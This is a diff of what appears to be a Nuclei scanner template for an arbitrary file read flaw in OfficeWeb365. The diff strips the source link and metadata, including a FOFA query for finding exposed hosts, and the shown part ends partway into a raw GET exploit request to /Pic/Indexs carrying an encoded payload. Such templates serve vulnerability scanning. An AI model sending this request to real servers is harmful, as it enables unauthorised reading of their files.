@@ -3,12 +3,8 @@ info:
   name: Office365 Indexs 任意文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mnihlb1kyeo81ih4'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mnihlb1kyeo81ih4
-    fofa: header="OfficeWeb365" || body="请输入furl参数"
 http:
 - raw:
   - 'GET /Pic/Indexs?imgs=DJwkiEm6KXJZ7aEiGyN4Cz83Kn1PLaKA09 HTTP/1.1
